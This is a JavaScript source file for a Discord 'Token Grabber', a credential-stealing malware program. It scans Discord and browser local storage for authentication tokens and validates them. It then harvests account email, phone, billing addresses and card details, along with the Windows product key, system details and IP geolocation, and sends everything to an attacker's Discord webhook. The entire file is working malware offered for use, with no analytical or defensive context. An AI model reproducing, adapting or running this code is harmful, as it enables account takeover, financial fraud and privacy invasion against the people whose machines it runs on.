const childProcess = require("child_process");
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const fs = require("fs");
const os = require("os");
const { request } = require("axios").default;
const { WebhookURL } = require("./config.json");

const webhook = new Webhook({
  url: WebhookURL,
}).setUsername("Token Grabber");

const languages = {
  da: "Danish",
  de: "German",
  "en-GB": "English (UK)",
  "en-US": "English (US)",
  "es-ES": "Spanish",
  fr: "French",
  hr: "Croatian",
  lt: "Lithuanian",
  hu: "Hungarian",
  nl: "Dutch",
  no: "Norwegian",
  pl: "Polish",
  "pt-BR": "Portuguese",
  ro: "Romanian",
  fi: "Finnish",
  "sv-SE": "Swedish",
  vi: "Vietnamese",
  tr: "Turkish",
  cs: "Czech",
  el: "Greek",
  bg: "Bulgarian",
  ru: "Russian",
  uk: "Ukranian",
  th: "Thai",
  "zh-CN": "Chinese",
  ja: "Japanese",
  "zh-TW": "Taiwan",
  ko: "Korean",
};

const tokenPaths = {
  Discord: process.env.APPDATA + "\\discord\\Local Storage\\leveldb\\",
  "Discord Canary":
    process.env.APPDATA + "\\discordcanary\\Local Storage\\leveldb\\",
  "Discord PTB": process.env.APPDATA + "\\discordptb\\Local Storage\\leveldb\\",
  Lightcord: process.env.APPDATA + "\\Lightcord\\Local Storage\\leveldb\\",
  "Discord PTB": process.env.APPDATA + "\\discordptb\\Local Storage\\leveldb\\",
  Opera:
    process.env.APPDATA +
    "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
  "Opera GX":
    process.env.APPDATA +
    "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
  Amigo:
    process.env.LOCALAPPDATA + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
  Torch:
    process.env.LOCALAPPDATA + "\\Torch\\User Data\\Local Storage\\leveldb\\",
  Kometa:
    process.env.LOCALAPPDATA + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
  Orbitum:
    process.env.LOCALAPPDATA + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
  CentBrowser:
    process.env.LOCALAPPDATA +
    "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
  "7Star":
    process.env.LOCALAPPDATA +
    "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
  Sputnik:
    process.env.LOCALAPPDATA +
    "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
  Vivaldi:
    process.env.LOCALAPPDATA +
    "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
  "Chrome SxS":
    process.env.LOCALAPPDATA +
    "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
  Chrome:
    process.env.LOCALAPPDATA +
    "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
  "Epic Privacy Browser":
    process.env.LOCALAPPDATA +
    "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
  "Microsoft Edge":
    process.env.LOCALAPPDATA +
    "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
  Uran:
    process.env.LOCALAPPDATA +
    "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
  Yandex:
    process.env.LOCALAPPDATA +
    "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
  Brave:
    process.env.LOCALAPPDATA +
    "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
  Iridium:
    process.env.LOCALAPPDATA +
    "\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\",
};

function getIpInformation() {
  return new Promise((resolve) => {
    request({
      url: "http://ipinfo.io/json",
      method: "GET",
    })
      .then((response) => {
        resolve({
          ip: response.data.ip,
          city: response.data.city,
          region: response.data.region,
          postalCode: response.data.postal,
          googleMaps: `https://www.google.com/maps/search/google+map++${response.data.loc}`,
          country: response.data.country,
        });
        return;
      })
      .catch(() => {
        resolve("Error");
        return;
      });
  });
}

function getUserInformation(token) {
  return new Promise((resolve) => {
    request({
      url: "https://discord.com/api/v9/users/@me",
      method: "GET",
      headers: {
        Authorization: token,
      },
    })
      .then((response) => {
        resolve({
          username: response.data.username,
          discriminator: response.data.discriminator,
          id: response.data.id,
          lang: languages[response.data.locale] ?? response.data.location,
          mfa: response.data.mfa_enabled,
          nsfw: response.data.nsfw_allowed,
          email: response.data.email,
          phone: response.data.phone,
          verified: response.data.verified,
          token,
          avatar: response.data.avatar
            ? `https://cdn.discordapp.com/avatars/${response.data.id}/${
                response.data.avatar.startsWith("a_")
                  ? response.data.avatar + ".gif"
                  : response.data.avatar + ".png"
              }`
            : null,
          banner: response.data.banner
            ? `https://cdn.discordapp.com/banners/${response.data.id}/${
                response.data.banner.startsWith("a_")
                  ? response.data.banner + ".gif"
                  : response.data.banner + ".png"
              }`
            : null,
        });
        return;
      })
      .catch(() => {
        resolve("Error");
        return;
      });
  });
}

function getPcInformation() {
  return new Promise((resolve) => {
    childProcess.exec(
      "wmic path softwarelicensingservice get OA3xOriginalProductKey",
      (error, result) => {
        if (error) {
          resolve("Error");
          return;
        } else {
          childProcess.exec("echo %username%", (error, result2) => {
            if (error) {
              resolve("Error");
              return;
            } else {
              resolve({
                computerName: os.hostname(),
                platform:
                  os.platform() === "win32"
                    ? "Windows"
                    : os.platform()[0].toUpperCase() + os.platform().slice(1),
                cpu: os.cpus()[0].model,
                ram: (os.totalmem() / 1024 / 1024 / 1024).toFixed(0),
                windowsKey: result.split("\n")[1],
                userName: result2.split("\n")[0],
              });

              return;
            }
          });
          return;
        }
      }
    );
  });
}

function getTokens() {
  const tokens = [];
  for (const path in tokenPaths) {
    const tokenFolder = tokenPaths[path];
    if (fs.existsSync(tokenFolder)) {
      const tokenFiles = fs
        .readdirSync(tokenFolder)
        .filter((file) => file.endsWith(".ldb"));
      for (const file of tokenFiles) {
        let localDatabaseFile = fs.readFileSync(tokenFolder + file, "utf-8");
        while ((index = localDatabaseFile.indexOf("oken") != -1)) {
          localDatabaseFile = localDatabaseFile.substring(
            index + "oken".length
          );
        }
        tokens.push(localDatabaseFile.split('"')[1]);
      }
    }
  }
  return tokens;
}

function checkToken(token) {
  return new Promise((resolve) => {
    request({
      url: "https://discord.com/api/v9/users/@me",
      method: "GET",
      headers: {
        Authorization: token,
      },
    })
      .then(() => {
        resolve(true);
        return;
      })
      .catch(() => {
        resolve(false);
        return;
      });
  });
}

function getPayments(token) {
  return new Promise((resolve) => {
    request({
      url: "https://discordapp.com/api/v9/users/@me/billing/payment-sources",
      method: "GET",
      headers: {
        Authorization: token,
      },
    })
      .then((response) => {
        let payments = "";

        for (const payment of response.data) {
          payments += `----------------------------------------------------------------\n
No: **** **** **** ${payment.last_4} (${
            payment.brand[0].toUpperCase() + payment.brand.slice(1)
          })
Expires: ${payment.expires_month}/${payment.expires_year}
Country: ${payment.country}\nInvalid: ${payment.invalid}
Address:
  - Name: ${payment.billing_address.name}
  - Line 1: ${payment.billing_address.line_1}
  - Line 2: ${payment.billing_address.line_2}
  - City: ${payment.billing_address.city}
  - State: ${payment.billing_address.state}
  - State: ${payment.billing_address.state}
  - Postal Code: ${payment.billing_address.postal_code}\n\n`;
        }
        resolve(payments);
        return;
      })
      .catch(() => {
        resolve(null);
        return;
      });
  });
}

(async () => {
  const ipInformation = await getIpInformation();
  const pcInformation = await getPcInformation();
  const tokens = getTokens();

  for (const token of tokens) {
    if (await checkToken(token)) {
      const userInformation = await getUserInformation(token);
      const payments = await getPayments(token);

      await webhook.send(
        new MessageBuilder().setTitle(
          userInformation.username + "#" + userInformation.discriminator
        ).setDescription(`**__PC Information__
      \`\`\`Computer Name: ${pcInformation.computerName}
User Name: ${pcInformation.userName}
Platorm: ${pcInformation.platform}
RAM: ${pcInformation.ram} GB
CPU: ${pcInformation.cpu}
Windows Key: ${pcInformation.windowsKey}\`\`\`
__User Information__
\`\`\`Username: ${userInformation.username}
Discriminator: ${userInformation.discriminator}
Id: ${userInformation.id}
Language: ${userInformation.lang}
2FA: ${userInformation.mfa}
Email: ${userInformation.email}
Phone: ${userInformation.phone}
Verified: ${userInformation.verified}\`\`\`
__IP Information__
\`\`\`IP: ${ipInformation.ip}
Country: ${ipInformation.country}
City: ${ipInformation.city}
Region: ${ipInformation.region}
Postal Code: ${ipInformation.postalCode}\`\`\`
[Google Maps](${ipInformation.googleMaps})\n
__TOKEN__
\`\`\`${userInformation.token}\`\`\`**`)
      );

      if (userInformation.avatar) {
        await webhook.send(`**__AVATAR__**\n${userInformation.avatar}`);
      }

      if (userInformation.banner) {
        await webhook.send(`**__BANNER__**\n${userInformation.banner}`);
      }

      if (payments) {
        fs.writeFileSync(
          `${process.env.LOCALAPPDATA}\\Cards.txt`,
          payments,
          "utf-8"
        );
        await webhook.sendFile(`${process.env.LOCALAPPDATA}\\Cards.txt`);
        fs.unlinkSync(`${process.env.LOCALAPPDATA}\\Cards.txt`);
      }
    }
  }
})();
